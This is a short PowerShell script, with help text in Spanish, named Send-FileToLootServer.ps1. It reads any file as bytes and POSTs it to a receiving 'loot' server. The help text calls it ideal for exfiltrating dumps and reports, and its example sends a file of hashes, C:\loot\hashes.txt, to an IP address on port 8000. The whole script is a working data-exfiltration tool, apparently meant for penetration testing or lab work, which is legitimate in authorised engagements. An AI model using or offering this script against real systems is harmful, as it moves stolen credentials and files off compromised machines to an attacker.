<#
.SYNOPSIS
    Envía un archivo al servidor de looteo vía HTTP POST.

.DESCRIPTION
    Lee el archivo como bytes y lo envía a un servidor mediante una petición POST.
    Ideal para exfiltración de archivos como dumps, reportes, etc.

.PARAMETER FilePath
    Ruta absoluta del archivo a enviar.

.PARAMETER URL
    URL del servidor HTTP receptor (por ejemplo, http://192.168.45.203:8000).

.EXAMPLE
    .\Send-FileToLootServer.ps1 -FilePath "C:\loot\hashes.txt" -URL "http://192.168.45.203:8000"

.NOTES
    Asegúrate de que el servidor esté escuchando en esa URL y puerto.
#>

param (
    [Parameter(Mandatory = $true)]
    [string]$FilePath,

    [Parameter(Mandatory = $true)]
    [string]$URL
)

try {
    if (-not (Test-Path $FilePath)) {
        Write-Error "Archivo no encontrado: $FilePath"
        exit 1
    }

    $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)

    $Headers = @{
        "X-Filename" = [System.IO.Path]::GetFileName($FilePath)
    }

    Invoke-WebRequest -Uri $URL -Method POST -Body $FileBytes -Headers $Headers -UseBasicParsing

    Write-Host "Archivo enviado exitosamente: $($Headers["X-Filename"])"
}
catch {
    Write-Error "Error al enviar archivo: $_"
    exit 1
}
